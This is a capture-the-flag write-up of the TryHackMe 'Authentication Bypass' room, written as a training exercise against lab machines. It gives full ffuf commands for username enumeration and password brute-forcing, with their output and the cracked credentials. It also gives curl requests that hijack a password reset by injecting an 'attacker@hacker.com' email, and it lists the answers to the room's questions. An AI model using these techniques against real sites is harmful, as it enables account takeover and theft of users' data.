---
title:  "THM: Authentication Bypass"
date:   2024-02-19 18:00:00 +0000
categories: [WebHacking]
tags: [WebHacking]
---

![image](/assets/img/authentication-Bypass.png)

---
Ref: 

- [THM Authentication Bypass:](https://tryhackme.com/room/authenticationbypass)

- [FFUF Github](https://github.com/ffuf/ffuf)

- [Link](https://www.youtube.com/watch?v=BdgXV-FCthw&t=223s)

---
Task 1  Introduction
---
Different ways website authentication methods can be bypassed, defeated or broken. These vulnerabilities can be some of the most critical as it often ends in leaks of customers personal data.

Task 2  Username Enumeration
---

A helpful exercise to complete when trying to find authentication vulnerabilities is creating a list of valid usernames, which we'll use later in other tasks.



Website error messages are great resources for collating this information to build our list of valid usernames. We have a form to create a new user account if we go to the Acme IT Support website (http://MACHINE_IP/customers/signup) signup page.



If you try entering the username admin and fill in the other form fields with fake information, you'll see we get the error An account with this username already exists. We can use the existence of this error message to produce a list of valid usernames already signed up on the system by using the ffuf tool below. The ffuf tool uses a list of commonly used usernames to check against for any matches.



#### Username enumeration with ffuf
```
user@tryhackme$ ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://MACHINE_IP/customers/signup -mr "username already exists"
```
```
user@tryhackme$ ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.67.239/customers/signup -mr "username already exists"
```
Result
```
        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1
________________________________________________

 :: Method           : POST
 :: URL              : http://10.10.67.239/customers/signup
 :: Wordlist         : FUZZ: /usr/share/wordlists/SecLists/Usernames/Names/names.txt
 :: Header           : Content-Type: application/x-www-form-urlencoded
 :: Data             : username=FUZZ&email=x&password=x&cpassword=x
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Regexp: username already exists
________________________________________________

:: Progress: [40/10164] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Erroadmin                   [Status: 200, Size: 3720, Words: 992, Lines: 77]
:: Progress: [125/10164] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Err:: Progress: [180/10164] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Err:: Progress: [341/10164] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Err:: Progress: [494/10164] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Err:: Progress: [647/10164] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Err:: Progress: [805/10164] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Err:: Progress: [968/10164] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Err:: Progress: [1128/10164] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Er:: Progress: [1310/10164] :: Job [1/1] :: 1382 req/sec :: Duration: [0:00:01] :::: Progress: [1484/10164] :: Job [1/1] :: 1339 req/sec :: Duration: [0:00:01] :::: Progress: [1659/10164] :: Job [1/1] :: 1428 req/sec :: Duration: [0:00:01] :::: Progress: [1835/10164] :: Job [1/1] :: 1455 req/sec :: Duration: [0:00:01] :::: Progress: [2008/10164] :: Job [1/1] :: 1378 req/sec :: Duration: [0:00:01] :::: Progress: [2188/10164] :: Job [1/1] :: 1401 req/sec :: Duration: [0:00:01] :::: Progress: [2365/10164] :: Job [1/1] :: 1454 req/sec :: Duration: [0:00:01] :::: Progress: [2537/10164] :: Job [1/1] :: 1340 req/sec :: Duration: [0:00:01] :::: Progress: [2722/10164] :: Job [1/1] :: 1487 req/sec :: Duration: [0:00:02] :::: Progress: [2907/10164] :: Job [1/1] :: 1546 req/sec :: Duration: [0:00:02] :::: Progress: [3096/10164] :: Job [1/1] :: 1473 req/sec :: Duration: [0:00:02] :::: Progress: [3270/10164] :: Job [1/1] :: 1483 req/sec :: Duration: [0:00:02] :::: Progress: [3461/10164] :: Job [1/1] :: 1451 req/sec :: Duration: [0:00:02] :::: Progress: [3648/10164] :: Job [1/1] :: 1464 req/sec :: Duration: [0:00:02] :::: Progress: [3831/10164] :: Job [1/1] :: 1473 req/sec :: Duration: [0:00:02] :::: Progress: [4012/10164] :: Job [1/1] :: 1434 req/sec :: Duration: [0:00:02] :::: Progress: [4202/10164] :: Job [1/1] :: 1530 req/sec :: Duration: [0:00:03] :::: Progress: [4396/10164] :: Job [1/1] :: 1527 req/sec :: Duration: [0:00:03] :::: Progress: [4585/10164] :: Job [1/1] :: 1532 req/sec :: Duration: [0:00:03] :::: Progress: [4770/10164] :: Job [1/1] :: 1419 req/sec :: Duration: [0:00:03] :::: Progress: [4950/10164] :: Job [1/1] :: 1434 req/sec :: Duration: [0:00:03] :::: Progress: [5125/10164] :: Job [1/1] :: 1425 req/sec :: Duration: [0:00:03] :::: Progress: [5314/10164] :: Job [1/1] :: 1527 req/sec :: Duration: [0:00:03] :::: Progress: [5503/10164] :: Job [1/1] :: 1528 req/sec :: Duration: [0:00:03] :::: Progress: [5699/10164] :: Job [1/1] :: 1534 req/sec :: Duration: [0:00:04] :::: Progress: [5889/10164] :: Job [1/1] :: 1487 req/sec :: Duration: [0:00:04] :::: Progress: [6072/10164] :: Job [1/1] :: 1451 req/sec :: Duration: [0:00:04] :::: Progress: [6259/10164] :: Job [1/1] :: 1488 req/sec :: Duration: [0:00:04] :::: Progress: [6441/10164] :: Job [1/1] :: 1508 req/sec :: Duration: [0:00:04] :::: Progress: [6625/10164] :: Job [1/1] :: 1405 req/sec :: Duration: [0:00:04] :::: Progress: [6810/10164] :: Job [1/1] :: 1522 req/sec :: Duration: [0:00:04] :::: Progress: [7000/10164] :: Job [1/1] :: 1501 req/sec :: Duration: [0:00:04] :::: Progress: [7194/10164] :: Job [1/1] :: 1530 req/sec :: Duration: [0:00:05] :::: Progress: [7385/10164] :: Job [1/1] :: 1514 req/sec :: Duration: [0:00:05] :::: Progress: [7574/10164] :: Job [1/1] :: 1558 req/sec :: Duration: [0:00:05] :::: Progress: [7763/10164] :: Job [1/1] :: 1503 req/sec :: Duration: [0:00:05] :::: Progress: [7953/10164] :: Job [1/1] :: 1521 req/sec :: Duration: [0:00:05] :::: Progress: [8134/10164] :: Job [1/1] :: 1431 req/sec :: Duration: [0:00:05] ::robert                  [Status: 200, Size: 3720, Words: 992, Lines: 77]
:: Progress: [8150/10164] :: Job [1/1] :: 1431 req/sec :: Duration: [0:00:05] :::: Progress: [8330/10164] :: Job [1/1] :: 1570 req/sec :: Duration: [0:00:05] :::: Progress: [8519/10164] :: Job [1/1] :: 1535 req/sec :: Duration: [0:00:05] :::: Progress: [8712/10164] :: Job [1/1] :: 1536 req/sec :: Duration: [0:00:06] ::simon                   [Status: 200, Size: 3720, Words: 992, Lines: 77]
:: Progress: [8844/10164] :: Job [1/1] :: 1453 req/sec :: Duration: [0:00:06] :::: Progress: [8900/10164] :: Job [1/1] :: 1524 req/sec :: Duration: [0:00:06] ::steve                   [Status: 200, Size: 3720, Words: 992, Lines: 77]
:: Progress: [8987/10164] :: Job [1/1] :: 1597 req/sec :: Duration: [0:00:06] :::: Progress: [9091/10164] :: Job [1/1] :: 1478 req/sec :: Duration: [0:00:06] :::: Progress: [9271/10164] :: Job [1/1] :: 1483 req/sec :: Duration: [0:00:06] :::: Progress: [9451/10164] :: Job [1/1] :: 1438 req/sec :: Duration: [0:00:06] :::: Progress: [9633/10164] :: Job [1/1] :: 1494 req/sec :: Duration: [0:00:06] :::: Progress: [9820/10164] :: Job [1/1] :: 1423 req/sec :: Duration: [0:00:06] :::: Progress: [10000/10164] :: Job [1/1] :: 1502 req/sec :: Duration: [0:00:06] ::: Progress: [10164/10164] :: Job [1/1] :: 1596 req/sec :: Duration: [0:00:07] ::: Progress: [10164/10164] :: Job [1/1] :: 1650 req/sec :: Duration: [0:00:07] :: Errors: 0 ::
```


In the above example, the ```-w``` argument selects the file's location on the computer that contains the list of usernames that we're going to check exists. 

The ```-X``` argument specifies the request method, this will be a GET request by default, but it is a POST request in our example. 

The ```-d``` argument specifies the data that we are going to send. In our example, we have the fields username, email, password and cpassword. We've set the value of the username to FUZZ. 

In the ffuf tool, the FUZZ keyword signifies where the contents from our wordlist will be inserted in the request. 

The ```-H``` argument is used for adding additional headers to the request. In this instance, we're setting the ```Content-Type``` so the web server knows we are sending form data. 

The ```-u``` argument specifies the URL we are making the request to, and 

finally, the ```-mr``` argument is the text on the page we are looking for to validate we've found a valid username.

The ffuf tool and wordlist come pre-installed on the AttackBox or can be installed locally by downloading it from https://github.com/ffuf/ffuf.


Create a file called ```valid_usernames.txt``` and add the usernames that you found using ffuf; these will be used in Task 3.


---


What is the username starting with si*** ?
```
simon
```
What is the username starting with st*** ?
```
steve
```
What is the username starting with ro**** ?
```
robert
```

Task 3  Brute Force
---
Using the valid_usernames.txt file we generated in the previous task, we can now use this to attempt a brute force attack on the login page (http://10.10.67.239/customers/login).

#### Note: 
If you created your ```valid_usernames``` file by piping the output from ffuf directly you may have difficulty with this task. Clean your data, or copy just the names into a new file.



A brute force attack is an automated process that tries a list of commonly used passwords against either a single username or, like in our case, a list of usernames.



When running this command, make sure the terminal is in the same directory as the ```valid_usernames.txt``` file.



#### Bruteforcing with ffuf
---
```
ffuf -w valid_usernames.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.67.239/customers/login -fc 200
```

This ffuf command is a little different to the previous one in Task 2. Previously we used the FUZZ keyword to select where in the request the data from the wordlists would be inserted, but because we're using multiple wordlists, we have to specify our own FUZZ keyword. In this instance, we've chosen W1 for our list of valid usernames and W2 for the list of passwords we will try. The multiple wordlists are again specified with the -w argument but separated with a comma.  For a positive match, we're using the -fc argument to check for an HTTP status code other than 200.


```
root@ip-10-10-190-146:/usr/share/wordlists/SecLists/Passwords/Common-Credentials# touch valid_usernames.txt
root@ip-10-10-190-146:/usr/share/wordlists/SecLists/Passwords/Common-Credentials# vim valid_usernames.txt
root@ip-10-10-190-146:/usr/share/wordlists/SecLists/Passwords/Common-Credentials# ffuf -w valid_usernames.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.67.239/customers/login -fc 200
 
        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1
________________________________________________

 :: Method           : POST
 :: URL              : http://10.10.67.239/customers/login
 :: Wordlist         : W1: valid_usernames.txt
 :: Wordlist         : W2: /usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt
 :: Header           : Content-Type: application/x-www-form-urlencoded
 :: Data             : username=W1&password=W2
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
 :: Filter           : Response status: 200
________________________________________________

[Status: 302, Size: 0, Words: 1, Lines: 1]
    * W1: steve
    * W2: thunder

:: Progress: [400/400] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors: 0 ::
```

---
What is the valid username and password (format: username/password)?
```
steve/thunder
```

Task 4  Logic Flaw
---
What is a Logic Flaw?

Sometimes authentication processes contain logic flaws. A logic flaw is when the typical logical path of an application is either bypassed, circumvented or manipulated by a hacker. Logic flaws can exist in any area of a website, but we're going to concentrate on examples relating to authentication in this instance.

![image](/assets/img/authentication-Bypass01.png)

Logic Flaw Example

The below mock code example checks to see whether the start of the path the client is visiting begins with /admin and if so, then further checks are made to see whether the client is, in fact, an admin. If the page doesn't begin with /admin, the page is shown to the client.
if( url.substr(0,6) === '/admin') {
    # Code to check user is an admin
} else {
    # View Page
}

Because the above PHP code example uses three equals signs (===), it's looking for an exact match on the string, including the same letter casing. The code presents a logic flaw because an unauthenticated user requesting /adMin will not have their privileges checked and have the page displayed to them, totally bypassing the authentication checks.

Logic Flaw Practical

We're going to examine the Reset Password function of the Acme IT Support website (http://10.10.67.239/customers/reset). We see a form asking for the email address associated with the account on which we wish to perform the password reset. If an invalid email is entered, you'll receive the error message "Account not found from supplied email address".



For demonstration purposes, we'll use the email address robert@acmeitsupport.thm which is accepted. We're then presented with the next stage of the form, which asks for the username associated with this login email address. If we enter robert as the username and press the Check Username button, you'll be presented with a confirmation message that a password reset email will be sent to robert@acmeitsupport.thm.

![image](/assets/img/authentication-Bypass02.png)


At this stage, you may be wondering what the vulnerability could be in this application as you have to know both the email and username and then the password link is sent to the email address of the account owner.

This walkthrough will require running both of the below Curl Requests on the AttackBox which can be opened by using the Blue Button Above.

In the second step of the reset email process, the username is submitted in a POST field to the web server, and the email address is sent in the query string request as a GET field.

Let's illustrate this by using the curl tool to manually make the request to the webserver.

#### Curl Request 1:
```
user@tryhackme$ curl 'http://10.10.67.239/customers/reset?email=robert%40acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert'
```
We use the ```-H``` flag to add an additional header to the request. In this instance, we are setting the ```Content-Type``` to application/x-www-form-urlencoded, which lets the web server know we are sending form data so it properly understands our request.

In the application, the user account is retrieved using the query string, but later on, in the application logic, the password reset email is sent using the data found in the PHP variable ```$_REQUEST```.

The PHP ```$_REQUEST``` variable is an array that contains data received from the query string and POST data. If the same key name is used for both the query string and POST data, the application logic for this variable favours POST data fields rather than the query string, so if we add another parameter to the POST form, we can control where the password reset email gets delivered.

#### Curl Request 2:
```
user@tryhackme$ curl 'http://10.10.67.239/customers/reset?email=robert%40acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert&email=attacker@hacker.com'
```
![image](/assets/img/authentication-Bypass03.png)

For the next step, you'll need to create an account on the Acme IT support customer section, doing so gives you a unique email address that can be used to create support tickets. The email address is in the format of ```{username}@customer.acmeitsupport.thm```

Now rerunning ```Curl Request 2``` but with your @acmeitsupport.thm in the email field you'll have a ticket created on your account which contains a link to log you in as Robert. Using Robert's account, you can view their support tickets and reveal a flag.

#### Curl Request 2 (but using your @acmeitsupport.thm account):
```
user@tryhackme:~$ curl 'http://10.10.67.239/customers/reset?email=robert@acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert&email={username}@customer.acmeitsupport.thm'
```